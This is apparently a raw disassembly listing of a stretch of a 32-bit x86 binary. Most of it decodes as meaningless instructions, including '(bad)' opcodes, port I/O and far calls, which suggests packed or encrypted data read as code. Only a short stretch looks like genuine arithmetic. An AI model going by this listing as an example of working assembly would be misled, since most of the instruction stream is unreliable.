  413e81:	sbb    BYTE PTR [edx+0x7f447d2f],ch
  413e87:	cmc    
  413e88:	inc    edx
  413e89:	mov    al,ds:0x53d13cc9
  413e8e:	mov    dl,0x2a
  413e90:	es popa 
  413e92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e93:	push   0x3b
  413e95:	sbb    eax,0xfd916fe1
  413e9a:	cdq    
  413e9b:	out    0xe5,al
  413e9d:	add    DWORD PTR [ebx-0x6c],esp
  413ea0:	cmp    DWORD PTR [edi+0x37],edx
  413ea3:	pop    ebx
  413ea4:	dec    ebp
  413ea5:	push   ecx
  413ea6:	jns    0x413e3b
  413ea8:	fs dec esi
  413eaa:	popa   
  413eab:	mov    eax,0x2058074f
  413eb0:	das    
  413eb1:	div    DWORD PTR [edx+edx*8+0x6]
  413eb5:	ror    ebx,cl
  413eb7:	sti    
  413eb8:	add    bh,cl
  413eba:	lahf   
  413ebb:	leave  
  413ebc:	in     eax,dx
  413ebd:	clc    
  413ebe:	(bad)  [edi]
  413ec0:	fwait
  413ec1:	pop    eax
  413ec2:	loop   0x413e4a
  413ec4:	test   BYTE PTR [esi+0x22caf4ac],bl
  413eca:	leave  
  413ecb:	loope  0x413ef7
  413ecd:	sar    BYTE PTR [edx],1
  413ecf:	pop    es
  413ed0:	push   es
  413ed1:	add    esi,DWORD PTR [edx+0x0]
  413ed4:	jg     0x413ec4
  413ed6:	mov    BYTE PTR [esi],dh
  413ed8:	(bad)  
  413ed9:	rcl    BYTE PTR [edi+0x2a4b523f],1
  413edf:	in     eax,dx
  413ee0:	les    esp,FWORD PTR [ecx]
  413ee2:	jge    0x413e65
  413ee4:	cs adc bl,al
  413ee7:	mov    eax,?
  413ee9:	pusha  
  413eea:	sbb    DWORD PTR [edi],ecx
  413eec:	sbb    al,0x5d
  413eee:	xor    al,0xed
  413ef0:	enter  0xe25f,0xea
  413ef4:	or     eax,0x391860b5
  413ef9:	pop    ss
  413efa:	out    0xec,al
  413efc:	rcl    bl,cl
  413efe:	xor    al,0xfa
  413f00:	mov    ah,0xe1
  413f02:	cmp    BYTE PTR [ebx+0xd],dh
  413f05:	inc    ebx
  413f06:	iret   
  413f07:	xor    bl,BYTE PTR [edi+eax*4]
  413f0a:	add    DWORD PTR [eax],edi
  413f0c:	mov    ds:0xe0d81761,eax
  413f11:	dec    edi
  413f12:	mov    cl,0x34
  413f14:	cwde   
  413f15:	fwait
  413f16:	lea    edi,[eax+0x78]
  413f19:	sub    esp,edx
  413f1b:	repz push es
  413f1d:	push   0xab35ed5a
  413f22:	fs inc esi
  413f24:	out    dx,al
  413f25:	mov    ebp,0x8cdb8945
  413f2a:	daa    
  413f2b:	popf   
  413f2c:	icebp  
  413f2d:	fwait
  413f2e:	cmp    eax,0x1346275e
  413f33:	jmp    0x413edf
  413f35:	dec    eax
  413f36:	or     al,0xde
  413f38:	mov    eax,ds:0x374cf0a6
  413f3d:	aas    
  413f3e:	nop
  413f3f:	aad    0x46
  413f41:	dec    eax
  413f42:	mov    ds:0x641e1ab8,eax
  413f47:	jg     0x413f7b
  413f49:	mov    bl,BYTE PTR [edi+0x6a]
  413f4c:	sub    DWORD PTR [ecx+0x7a5aa2f5],esi
  413f52:	(bad)  
  413f53:	jp     0x413f78
  413f55:	jae    0x413f18
  413f57:	in     al,dx
  413f58:	cmp    DWORD PTR [edi-0x76],esi
  413f5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f5c:	fwait
  413f5d:	or     eax,0x9e82df6c
  413f62:	cdq    
  413f63:	aad    0xd5
  413f65:	iret   
  413f66:	ror    BYTE PTR [esi],cl
  413f68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f69:	and    eax,0x6644e11e
  413f6e:	lds    eax,FWORD PTR [edx-0x46]
  413f71:	jbe    0x413f66
  413f73:	jo     0x413f09
  413f75:	xchg   ecx,eax
  413f76:	xor    edx,esi
  413f78:	ins    BYTE PTR es:[edi],dx
  413f79:	es retf 
  413f7b:	imul   ecx,ebx,0xffffffd2
  413f7e:	in     al,dx
  413f7f:	pusha  
  413f80:	sub    BYTE PTR [esp+eax*4],al
  413f83:	inc    ecx
  413f84:	jns    0x413fca
  413f86:	add    BYTE PTR [ebp+0x7b],0xfe
  413f8a:	enter  0xc61b,0x6
  413f8e:	(bad)  
  413f8f:	pop    edx
  413f90:	sbb    edi,DWORD PTR [edi]
  413f92:	xchg   edx,eax
  413f93:	cmp    ecx,esp
  413f95:	cwde   
  413f96:	imul   ecx,DWORD PTR [eax+0x558bc63c],0xf85d8b08
  413fa0:	xor    edx,eax
  413fa2:	xor    ebx,eax
  413fa4:	sub    edx,ebx
  413fa6:	sub    edx,esi
  413fa8:	xor    edx,eax
  413faa:	mov    DWORD PTR [ebp+0x8],edx
  413fad:	mov    edx,DWORD PTR [ebp+0x8]
  413fb0:	mov    ebx,DWORD PTR [ebp-0x58]
  413fb3:	add    edx,0x5708c4
  413fb9:	imul   edx,ebx
  413fbc:	mov    DWORD PTR [ebp-0x58],edx
  413fbf:	mov    edx,DWORD PTR [ebp+0x8]
  413fc2:	mov    ebx,DWORD PTR [ebp-0x54]
  413fc5:	add    edx,0x64f8da
  413fcb:	or     edx,ebx
  413fcd:	mov    DWORD PTR [ebp-0x54],edx
  413fd0:	mov    edx,DWORD PTR [ebp+0x8]
  413fd3:	mov    ebx,DWORD PTR [ebp-0x50]
  413fd6:	add    edx,ecx
  413fd8:	xor    edx,ebx
  413fda:	mov    DWORD PTR [ebp-0x50],edx
  413fdd:	mov    edx,DWORD PTR [ebp+0x8]
  413fe0:	mov    ebx,DWORD PTR [ebp-0x4c]
  413fe3:	add    edx,edi
  413fe5:	and    edx,ebx
  413fe7:	mov    DWORD PTR [ebp-0x4c],edx
  413fea:	mov    edx,DWORD PTR [ebp+0x8]
  413fed:	mov    ebx,DWORD PTR [ebp-0x48]
  413ff0:	lea    edx,[ebx+edx*1+0x241fc1f]
  413ff7:	mov    DWORD PTR [ebp-0x48],edx
  413ffa:	mov    edx,DWORD PTR [ebp+0x8]
  413ffd:	mov    ebx,0xfa5e15e2
  414002:	jmp    0x4163b6
  414007:	scas   eax,DWORD PTR es:[edi]
  414008:	shl    BYTE PTR [eax-0x7f],cl
  41400b:	jno    0x413f90
  41400d:	scas   eax,DWORD PTR es:[edi]
  41400e:	mov    dl,0xfb
  414010:	xor    DWORD PTR [edi-0x3e],edx
  414013:	mov    edx,0xa2c7d44d
  414018:	je     0x414096
  41401a:	jl     0x414007
  41401c:	pop    edi
  41401d:	jl     0x41409b
  41401f:	pop    ss
  414020:	inc    esp
  414021:	fsubrp st(0),st
  414023:	repz popf 
  414025:	sbb    BYTE PTR [edi+0x2ea94634],0x36
  41402c:	shr    DWORD PTR [eax],0x79
  41402f:	(bad)  
  414031:	cmc    
  414032:	sbb    BYTE PTR [eax],dl
  414034:	jb     0x41404f
  414036:	mov    cl,0xd9
  414038:	and    ebx,DWORD PTR cs:[edx+0x57]
  41403c:	pop    eax
  41403d:	mov    ah,0x5f
  41403f:	data16 sbb cl,BYTE PTR [ebp-0x124a5b55]
  414046:	mov    es,WORD PTR [ebp+0x3f]
  414049:	xchg   esp,eax
  41404a:	cwde   
  41404b:	mov    BYTE PTR [ecx+0x58],al
  41404e:	daa    
  41404f:	jne    0x414048
  414051:	sbb    edx,esp
  414053:	and    DWORD PTR [ecx],eax
  414055:	or     BYTE PTR [eax+edi*1+0x1b],0xe5
  41405a:	jle    0x41401d
  41405c:	mov    ecx,0x2b1a83b3
  414061:	call   FWORD PTR [ebx+edx*2+0x3a862561]
  414068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414069:	les    ebx,FWORD PTR [edi+0x1fe41baf]
  41406f:	xor    DWORD PTR [ebp+0x20],esp
  414072:	lea    ebx,[edi]
  414074:	pop    ds
  414075:	add    bl,BYTE PTR [esi]
  414077:	pop    edi
  414078:	out    dx,al
  414079:	adc    eax,0x7bff23eb
  41407e:	(bad)  
  41407f:	fst    DWORD PTR [edi+0x6298ade2]
  414085:	cmp    eax,0x3e8449fb
  41408a:	aaa    
  41408b:	or     DWORD PTR [edi-0x5204f7c],esp
  414091:	cmp    edi,edx
  414093:	(bad)  
  414095:	sub    edx,DWORD PTR [edx+edx*4]
  414098:	mov    al,0xc0
  41409a:	hlt    
  41409b:	pop    esp
  41409c:	out    0xee,eax
  41409e:	(bad)  
  4140a0:	test   DWORD PTR [ebp-0x26],edx
  4140a3:	sub    DWORD PTR [ecx],0x7d8b9fe9
  4140a9:	and    BYTE PTR [ebx-0x67],bl
  4140ac:	xor    al,0x8
  4140ae:	hlt    
  4140af:	lods   eax,DWORD PTR ds:[esi]
  4140b0:	mov    eax,ds:0x3ee6ffab
  4140b5:	xor    ebx,DWORD PTR [esi+0x20]
  4140b8:	setnp  BYTE PTR [ebx-0x9b6f9f0]
  4140bf:	push   esi
  4140c0:	pop    ss
  4140c1:	jmp    0x4140ca
  4140c3:	push   cs
  4140c4:	lods   eax,DWORD PTR gs:[esi]
  4140c6:	xchg   esi,eax
  4140c7:	push   edx
  4140c8:	int    0x4a
  4140ca:	in     al,dx
  4140cb:	div    DWORD PTR [ecx]
  4140cd:	adc    eax,0xcc368bda
  4140d2:	cmc    
  4140d3:	jp     0x414070
  4140d5:	stos   DWORD PTR es:[edi],eax
  4140d6:	or     DWORD PTR [edi+0x7d3f6d2a],esp
  4140dc:	xchg   esi,eax
  4140dd:	int3   
  4140de:	dec    edi
  4140df:	lds    esp,FWORD PTR [ecx+0x61fc1007]
  4140e5:	pop    ebx
  4140e6:	mul    eax
  4140e8:	ins    DWORD PTR es:[edi],dx
  4140e9:	dec    esi
  4140ea:	sub    al,0x97
  4140ec:	mov    WORD PTR [esi-0x6f],ds
  4140ef:	call   0x34386532
  4140f4:	je     0x414127
  4140f6:	sub    bl,0xe
  4140f9:	inc    DWORD PTR [ecx]
  4140fb:	push   edx
  4140fc:	push   ebp
  4140fd:	pop    ecx
  4140fe:	ja     0x414093
  414100:	mov    ebx,0xf9f63823
  414105:	sub    eax,0x49b16b3d
  41410a:	stos   BYTE PTR es:[edi],al
  41410b:	bsf    ebp,ebx
  41410e:	or     DWORD PTR [edx+0x6f],0x6f18db5e
  414115:	aaa    
  414116:	outs   dx,DWORD PTR ds:[esi]
  414117:	loope  0x4140f2
  414119:	dec    edx
  41411a:	sbb    edx,DWORD PTR [eax*4+0x27dfdf5d]
  414121:	mov    bl,0x89
  414123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414124:	push   esi
  414125:	cmp    al,0x67
  414127:	jl     0x414194
  414129:	cli    
  41412a:	push   ecx
  41412b:	fldcw  WORD PTR [esi+0x6a9b973c]
  414131:	cld    
  414132:	popf   
  414133:	sbb    al,0x16
  414135:	ror    DWORD PTR [eax],cl
  414137:	test   DWORD PTR [ebx],0xaa107550
  41413d:	je     0x4140c9
  41413f:	or     BYTE PTR [ebp-0x80],0xc5
  414143:	ss jo  0x4140fe
  414146:	inc    esp
  414147:	adc    esp,DWORD PTR [ecx+0x7b]
  41414a:	mov    WORD PTR [ebx-0x5f],?
  41414d:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41414f:	push   ebp
  414150:	and    dl,BYTE PTR [edi-0x7dbab458]
  414156:	or     eax,0xbb6f304d
  41415b:	fisubr DWORD PTR [ecx-0x5c]
  41415e:	imul   esp,DWORD PTR [ebx-0x70],0x56
  414162:	sub    eax,0xcab99a2e
  414167:	mov    esp,0x8e898cca
  41416c:	aaa    
  41416d:	jae    0x41411b
  41416f:	pop    ss
  414170:	sub    dh,BYTE PTR [ecx+ebp*2]
  414173:	imul   esp,DWORD PTR [ebp+0xa],0x46
  414177:	fcmovne st,st(6)
  414179:	push   cs
  41417a:	jmp    0x41418d
  41417c:	test   DWORD PTR [ecx],ebx
  41417e:	pushf  
  41417f:	mov    esi,0xbc82ea22
  414184:	pushf  
  414185:	addr16 dec edi
  414187:	leave  
  414188:	sub    edx,eax
  41418a:	jp     0x41411d
  41418c:	shr    BYTE PTR [edi-0x56],1
  41418f:	(bad)  
  414191:	add    bh,BYTE PTR [ebx]
  414193:	cmp    BYTE PTR [ebp+edx*2-0x7064a61f],bh
  41419a:	sub    eax,0xab5c7ddb
  41419f:	add    eax,0x6d8c8b97
  4141a4:	push   ds
  4141a5:	jnp    0x414221
  4141a7:	cmp    al,0xc5
  4141a9:	pop    ebp
  4141aa:	sub    eax,0x7b27c2e1
  4141af:	call   0xcfb3:0x3ad310c7
  4141b6:	inc    edi
  4141b7:	and    edx,DWORD PTR [ecx]
  4141b9:	push   eax
  4141ba:	lea    edx,[eax+0x5e]
  4141bd:	repz xor al,0x53
  4141c0:	push   ss
  4141c1:	out    0xbc,al
  4141c3:	jbe    0x4141db
  4141c5:	ins    BYTE PTR es:[edi],dx
  4141c6:	test   BYTE PTR [ecx-0x3b],bl
  4141c9:	sub    ebx,DWORD PTR [edi+0x69ca7f03]
  4141cf:	push   esp
  4141d0:	enterw 0x344,0x23
  4141d5:	pop    esi
  4141d6:	in     al,dx
  4141d7:	loop   0x414248
  4141d9:	xchg   ebp,eax
  4141da:	dec    ebx
  4141db:	inc    bl
  4141dd:	and    BYTE PTR [edi+edi*1-0x18921a29],bh
  4141e4:	test   DWORD PTR [esi+ebp*2],edi
  4141e7:	inc    edx
  4141e8:	sub    al,0x64
  4141ea:	test   eax,0x36989294
  4141ef:	mov    ds:0x99f19d73,eax
  4141f4:	push   cs
  4141f5:	bound  esi,QWORD PTR [edi-0x47]
  4141f8:	je     0x41426a
  4141fa:	adc    ebx,DWORD PTR [ebx]
  4141fc:	push   ss
  4141fd:	std    
  4141fe:	add    edx,edi
  414200:	xor    al,0x85
  414202:	retf   
  414203:	fnsave [eax]
  414205:	jp     0x41418b
  414207:	pop    eax
  414208:	test   DWORD PTR [ebx+0x23],0x9406d18e
  41420f:	loope  0x41422e
  414211:	mov    cl,BYTE PTR [edx-0x3e9dbac9]
  414217:	sar    ecx,1
  414219:	xor    eax,0x3f1cc8de
  41421e:	mov    cl,0x48
  414220:	pop    eax
  414221:	in     al,dx
  414222:	jo     0x4141b0
  414224:	pop    es
  414225:	sbb    al,0x6a
  414227:	ss sar al,1
  41422a:	retf   
  41422b:	outs   dx,BYTE PTR ds:[esi]
  41422c:	(bad)  
  41422d:	out    0x42,al
  41422f:	pop    esi
  414230:	cld    
  414231:	imul   ebp,DWORD PTR [edi-0x1711a58f],0x85561431
  41423b:	mov    edi,0x1577d556
  414240:	imul   ebx,esp,0x992e0ae6
  414246:	inc    ebx
  414247:	cwde   
  414248:	sub    dl,al
  41424a:	mov    ebp,0xc1aa0eba
  41424f:	pop    ecx
  414250:	fcmovbe st,st(5)
  414252:	ret    0x9cd2
  414255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414256:	pop    ss
  414257:	clc    
  414258:	pop    esi
  414259:	ret    
  41425a:	pop    esi
  41425b:	and    BYTE PTR [edx+0x50],al
  41425e:	sub    bh,al
  414260:	sub    BYTE PTR ds:[ebx],0xca
  414264:	scas   al,BYTE PTR es:[edi]
  414265:	stos   DWORD PTR es:[edi],eax
  414266:	adc    esp,DWORD PTR [esi]
  414268:	gs sahf 
  41426a:	pop    es
  41426b:	cwde   
  41426c:	sbb    BYTE PTR [edi+0x4be01266],al
  414272:	cmp    eax,0x793bdf59
  414277:	inc    edx
  414278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414279:	std    
  41427a:	inc    ecx
  41427b:	inc    edi
  41427c:	ret    0x295b
  41427f:	sbb    BYTE PTR [ecx],ah
  414281:	ret    
  414282:	adc    DWORD PTR [ebp-0x52],eax
  414285:	sbb    eax,0x6c29e71f
  41428a:	cli    
  41428b:	lea    edi,[ecx-0x18]
  41428e:	mov    dh,0xc1
  414290:	xchg   esi,edi
  414292:	shl    BYTE PTR [ecx-0x68],cl
  414295:	adc    ebx,ebp
  414297:	adc    DWORD PTR [ebp+0x7b],0x47d9c1e4
  41429e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41429f:	(bad)  
  4142a1:	aas    
  4142a2:	mov    eax,0xde94166a
  4142a7:	sbb    BYTE PTR ds:[edx],ah
  4142aa:	sub    DWORD PTR [ebx-0xca5b32c],ecx
  4142b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142b1:	or     eax,DWORD PTR [esi-0x40]
  4142b4:	mov    eax,DWORD PTR [edx]
  4142b6:	ja     0x41432e
  4142b8:	cwde   
  4142b9:	push   0xdfccf8ca
  4142be:	pop    esi
  4142bf:	(bad)  
  4142c0:	xchg   ebx,eax
  4142c1:	xchg   ebx,eax
  4142c2:	test   DWORD PTR [eax-0x743e5214],edi
  4142c8:	addr16 add eax,0x561f5f13
  4142ce:	mov    ss,WORD PTR [esi-0x16f8eb73]
  4142d4:	cdq    
  4142d5:	pop    eax
  4142d6:	cmp    bl,BYTE PTR [eax+0x4affcb7a]
  4142dc:	sub    ecx,DWORD PTR [esp+ebp*4-0x2c]
  4142e0:	adc    edx,ebp
  4142e2:	fldcw  WORD PTR [edi+0x7c6167fa]
  4142e8:	dec    esp
  4142e9:	daa    
  4142ea:	fimul  WORD PTR cs:[esi-0x18]
  4142ee:	pop    edi
  4142ef:	dec    ebp
  4142f0:	jb     0x41435a
  4142f2:	mov    BYTE PTR [eax+0x16754f33],ah
  4142f8:	call   0x57a8:0x1c623fda
  4142ff:	inc    edi
  414300:	push   0xb7e47184
  414305:	push   ebx
  414306:	addr16 loope 0x41430b
  414309:	pop    edi
  41430a:	push   ecx
  41430b:	sbb    dh,BYTE PTR [ecx-0x3c]
  41430e:	sub    cl,BYTE PTR [esi+0x12db4e99]
  414314:	ss mov ebp,0x52c7d7e0
  41431a:	xlat   BYTE PTR ds:[ebx]
  41431b:	inc    edi
  41431c:	inc    edi
  41431d:	cmc    
  41431e:	xor    al,0xb7
  414320:	(bad)  
  414321:	bound  esi,QWORD PTR [esi-0x5a460f5e]
  414327:	or     BYTE PTR [edx+0x296770e0],0xe4
  41432e:	scas   eax,DWORD PTR es:[edi]
  41432f:	outs   dx,BYTE PTR ds:[esi]
  414330:	inc    esp
  414331:	in     eax,dx
  414332:	ins    BYTE PTR es:[edi],dx
  414333:	adc    DWORD PTR [edx+0x4d],0x75c991fa
  41433a:	push   cs
  41433b:	into   
  41433c:	inc    eax
  41433d:	mov    BYTE PTR [ecx+0x51c1310b],cl
  414343:	or     ecx,DWORD PTR [edx+ebx*1]
  414346:	(bad)
  414349:	ficomp DWORD PTR [esi-0x64]
  41434c:	xchg   ebp,eax
  41434d:	ret    
  41434e:	sahf   
  41434f:	rcr    DWORD PTR [ebp+0x7f826889],0x61
  414356:	dec    eax
  414357:	and    esi,DWORD PTR [ecx+ecx*1]
  41435a:	jmp    0x5823676d
  41435f:	and    dl,BYTE PTR [esi]
  414361:	out    0x25,al
  414363:	(bad)  
  414364:	pminsw mm7,mm0
  414367:	pop    es
  414368:	jl     0x41438d
  41436a:	cmp    DWORD PTR [esp+ebx*1-0x6],eax
  41436e:	gs lahf 
  414370:	cmp    ebp,ebp
  414372:	push   0x1ca84337
  414377:	popa   
  414378:	dec    edi
  414379:	push   esp
  41437a:	rol    BYTE PTR [edx],1
  41437c:	ror    BYTE PTR [edx],cl
  41437e:	xor    eax,0xdd08a37d
  414383:	or     BYTE PTR [ecx+0x47],al
  414386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414387:	push   esp
  414388:	jmp    0x414348
  41438a:	pop    edi
  41438b:	jmp    0x4143ee
  41438d:	pop    ecx
  41438e:	mov    ah,0xcf
  414390:	rcl    BYTE PTR [eax-0x42],0x57
  414394:	in     al,0xce
  414396:	and    BYTE PTR [esi-0x18443062],bl
  41439c:	jmp    0xdce6cc58
  4143a1:	push   es
  4143a2:	sub    ebx,DWORD PTR [esi]
  4143a4:	aad    0xa2
  4143a6:	pop    esp
  4143a7:	loop   0x4143dd
  4143a9:	xchg   ecx,eax
  4143aa:	jae    0x414413
  4143ac:	out    0xcb,al
  4143ae:	loop   0x414344
  4143b0:	call   0x5c71:0x28514594
  4143b7:	cmp    al,0x65
  4143b9:	cdq    
  4143ba:	cmp    eax,0x4dafae5b
  4143bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143c0:	popa   
  4143c1:	int    0xc2
  4143c3:	(bad)  
  4143c5:	out    0xd9,al
  4143c7:	loopne 0x414387
  4143c9:	repnz stos DWORD PTR es:[edi],eax
  4143cb:	fst    DWORD PTR [ebx+eiz*1]
  4143ce:	ss xchg ebx,eax
  4143d0:	pop    eax
  4143d1:	nop
  4143d2:	mov    ebp,0x6ba5bd47
  4143d7:	fs in  eax,dx
  4143d9:	jp     0x414422
  4143db:	cmp    DWORD PTR [eax-0x56],esp
  4143de:	enter  0x4cc5,0x5f
  4143e2:	aaa    
  4143e3:	repz jns 0x4143c0
  4143e6:	or     eax,0xe7266e2a
  4143eb:	stc    
  4143ec:	mov    al,ds:0xa7ffe280
  4143f1:	test   ebx,0xd5d332f7
  4143f7:	(bad)  [eax]
  4143f9:	push   ds
  4143fa:	cmp    eax,0x8d726a12
  4143ff:	out    0x1f,eax
  414401:	mov    eax,ds:0x4791a01d
  414406:	cdq    
  414407:	mov    ebx,0xf1d11313
  41440c:	mov    dl,0x63
  41440e:	sbb    eax,0xb6d2910
  414413:	push   esp
  414414:	ror    BYTE PTR [esi+0x2e4510c6],0xa4
  41441b:	test   DWORD PTR [edi+0xf38df68],edx
  414421:	push   ss
  414422:	pop    edi
  414423:	push   ecx
  414424:	sar    esi,cl
  414426:	add    bh,BYTE PTR [esi]
  414428:	or     bl,0xc1
  41442b:	push   eax
  41442c:	mov    ebp,0x208abcd1
  414431:	mov    al,0xf0
  414433:	mov    edi,0xc453eea7
  414438:	call   0xb55c:0xe78340dc
  41443f:	mov    ch,0x54
  414441:	add    DWORD PTR [esi+edx*2+0x47],ebx
  414445:	fld    QWORD PTR [eax]
  414447:	retf   
  414448:	mov    WORD PTR [eax-0x80],?
  41444b:	mov    esi,0x923139a7
  414450:	cdq    
  414451:	mov    edx,0x5d01189a
  414456:	jnp    0x414496
  414458:	inc    edi
  414459:	mov    al,ds:0x10ab8a45
  41445e:	inc    eax
  41445f:	arpl   WORD PTR [ecx-0x686012ba],si
  414465:	and    esp,DWORD PTR [ebx+ebx*2+0x2d]
  414469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41446b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41446c:	adc    al,0x3e
  41446e:	or     dl,ah
  414470:	mov    bh,0x2
  414472:	les    esi,FWORD PTR [ebx]
  414474:	addr16 jb 0x4144ee
  414477:	push   ss
  414478:	es xor eax,0xc9733857
  41447e:	jo     0x414443
  414480:	or     al,0xaf
  414482:	xchg   edx,eax
  414483:	add    BYTE PTR [ebx+edx*8+0x41e00f54],0x91
  41448b:	sbb    eax,0xc09e618b
  414490:	jmp    0x4144e4
  414492:	xor    cl,cl
  414494:	call   0x831b:0x4d8777c9
  41449b:	mov    esp,DWORD PTR [ebp-0x7e9d5fc]
  4144a1:	test   BYTE PTR [ebx],cl
  4144a3:	or     ecx,DWORD PTR [edx+0x60]
  4144a6:	fnstsw WORD PTR gs:[eax+0x6d]
  4144aa:	shl    BYTE PTR [edi+0x22],0x4b
  4144ae:	push   ss
  4144af:	sub    BYTE PTR [ebp-0x3b],ch
  4144b2:	mov    ds:0x181bc3e5,al
  4144b7:	icebp  
  4144b8:	jl     0x414454
  4144ba:	in     al,dx
  4144bb:	mov    cs,WORD PTR [ebp+0x4d]
  4144be:	(bad)  
  4144c0:	sar    DWORD PTR [ecx+0x533136fb],cl
  4144c6:	xchg   BYTE PTR [esi-0x7a],dh
  4144c9:	out    dx,al
  4144ca:	push   0x5f
  4144cc:	jo     0x41445c
  4144ce:	fistp  DWORD PTR [eax+eax*8+0x6116f571]
  4144d5:	inc    ecx
  4144d6:	pushf  
  4144d7:	push   edi
  4144d8:	xchg   al,ch
  4144da:	cdq    
  4144db:	jns    0x414500
  4144dd:	aas    
  4144de:	gs in  eax,dx
  4144e0:	in     al,0x8b
  4144e2:	retf   
  4144e3:	test   ch,bh
  4144e5:	xor    ebp,DWORD PTR [ebx+0x67]
  4144e8:	sbb    bh,BYTE PTR [ecx+0x7b]
  4144eb:	loop   0x41449d
  4144ed:	out    dx,eax
  4144ee:	pop    ss
  4144ef:	(bad)  
  4144f0:	repz cs inc edi
  4144f3:	sahf   
  4144f4:	or     ebx,DWORD PTR [ebx]
  4144f6:	test   eax,0xe03a843e
  4144fb:	(bad)  [edi+0x2a2727eb]
  414501:	mov    eax,0xdd09a77c
  414506:	mov    al,0xde
  414508:	repnz test ebx,edx
  41450b:	push   edx
  41450c:	inc    esi
  41450d:	inc    ebx
  41450e:	mov    al,0x70
  414510:	adc    ah,BYTE PTR [edx+0x7cf699c3]
  414516:	sbb    eax,DWORD PTR cs:[eax-0x17]
  41451a:	outs   dx,DWORD PTR ds:[esi]
  41451b:	add    eax,DWORD PTR [eax]
  41451d:	push   ds
  41451e:	adc    al,cl
  414520:	mov    edi,0x2be34343
  414525:	ja     0x4144e4
  414527:	xchg   esp,eax
  414528:	cs and eax,0xd8ce7d69
  41452e:	mov    ebp,0x245ecd15
  414533:	popa   
  414534:	inc    esi
  414535:	mov    ah,0xaa
  414537:	inc    edi
  414538:	and    DWORD PTR [ecx-0x39],edx
  41453b:	pop    ecx
  41453c:	aam    0x98
  41453e:	and    BYTE PTR [ebx-0x3887ff],ch
  414544:	(bad)  
  414545:	(bad)
  414548:	pop    edi
  414549:	xor    ebx,ebp
  41454b:	retf   
  41454c:	dec    ecx
  41454d:	(bad)  
  41454e:	xchg   ebx,eax
  41454f:	cwde   
  414550:	sub    al,BYTE PTR [ebx]
  414552:	rcl    BYTE PTR [esi+ecx*4+0x76],1
  414556:	cmp    ah,BYTE PTR [eax+0x74344881]
  41455c:	icebp  
  41455d:	mov    esi,0x2b2f69e6
  414562:	inc    ebp
  414563:	push   edx
  414564:	adc    BYTE PTR [edx],ah
  414566:	outs   dx,DWORD PTR ds:[esi]
  414567:	adc    dh,ah
  414569:	cdq    
  41456a:	stc    
  41456b:	call   0xc47faedb
  414570:	cmp    dh,BYTE PTR [edx]
  414572:	xor    DWORD PTR [esi+0x1b],ecx
  414575:	cmp    DWORD PTR [ebp-0x88efee6],0xffffff84
  41457c:	or     al,BYTE PTR [edx]
  41457e:	push   ds
  41457f:	shr    DWORD PTR [esi-0x51a9e55],cl
  414585:	les    eax,FWORD PTR [ebx-0x13]
  414588:	test   BYTE PTR [ecx],bh
  41458a:	mov    ah,0x4e
  41458c:	xchg   edx,eax
  41458d:	pop    ss
  41458e:	push   0xd75d973a
  414593:	xchg   esp,eax
  414594:	dec    ebx
  414595:	cmp    al,0x95
  414597:	pop    ds
  414598:	loopne 0x414554
  41459a:	cmp    ebx,edi
  41459c:	fld    st(0)
  41459e:	pop    ebp
  41459f:	sar    ch,1
  4145a1:	(bad)  
  4145a2:	cdq    
  4145a3:	sti    
  4145a4:	mov    ebp,0x2273c845
  4145a9:	add    BYTE PTR [ebx-0x476fffe9],ah
  4145af:	fdivp  st(3),st
  4145b1:	dec    ecx
  4145b2:	xlat   BYTE PTR ds:[ebx]
  4145b3:	aad    0x98
  4145b5:	xchg   BYTE PTR [edi-0x6692882],dl
  4145bb:	xor    ecx,ecx
  4145bd:	pop    esi
  4145be:	push   ss
  4145bf:	sub    edx,DWORD PTR [ebp+ebx*4-0x604104f4]
  4145c6:	in     eax,dx
  4145c7:	cwde   
  4145c8:	sar    DWORD PTR [ebx-0x683e4110],1
  4145ce:	addr16 pop ss
  4145d0:	sar    DWORD PTR [eax-0x7c],1
  4145d3:	test   al,0xed
  4145d5:	jecxz  0x414569
  4145d7:	dec    ecx
  4145d8:	into   
  4145d9:	lds    ebp,FWORD PTR [edx+ebx*4+0x4c]
  4145dd:	jp     0x41457b
  4145df:	mov    al,0x60
  4145e1:	aas    
  4145e2:	pushf  
  4145e3:	loopne 0x414569
  4145e5:	add    ebp,DWORD PTR [ecx+0x5c77ed8d]
  4145eb:	scas   al,BYTE PTR es:[edi]
  4145ec:	jo     0x414590
  4145ee:	scas   eax,DWORD PTR es:[edi]
  4145ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145f0:	mov    bh,0xad
  4145f2:	js     0x4145fa
  4145f4:	pushf  
  4145f5:	or     ebx,DWORD PTR [eax+0x75]
  4145f8:	fidivr WORD PTR [esi-0x5]
  4145fb:	fmul   st,st(2)
  4145fd:	loop   0x41465f
  4145ff:	call   0xed21:0xe61cb2d
  414606:	jnp    0x41458a
  414608:	fs stos BYTE PTR es:[edi],al
  41460a:	int    0x86
  41460c:	out    dx,al
  41460d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41460f:	fst    QWORD PTR [ebx+0xb1278c9]
  414615:	cmc    
  414616:	mov    al,0xe5
  414618:	fmul   DWORD PTR [eax+0x56b7fbcd]
  41461e:	out    dx,al
  41461f:	aaa    
  414620:	inc    ebx
  414621:	sbb    ebp,eax
  414623:	push   edi
  414624:	mov    BYTE PTR [esi],cl
  414626:	xchg   BYTE PTR [ecx],dl
  414628:	cdq    
  414629:	push   eax
  41462a:	cmp    BYTE PTR [edx],0x4c
  41462d:	push   esp
  41462e:	jmp    0x4145b6
  414630:	mov    esi,0xeb4eb9c3
  414635:	mov    BYTE PTR [edx],ch
  414637:	test   eax,0x6be07ba3
  41463c:	inc    ebx
  41463d:	inc    ebp
  41463e:	mov    ecx,0x72c29c94
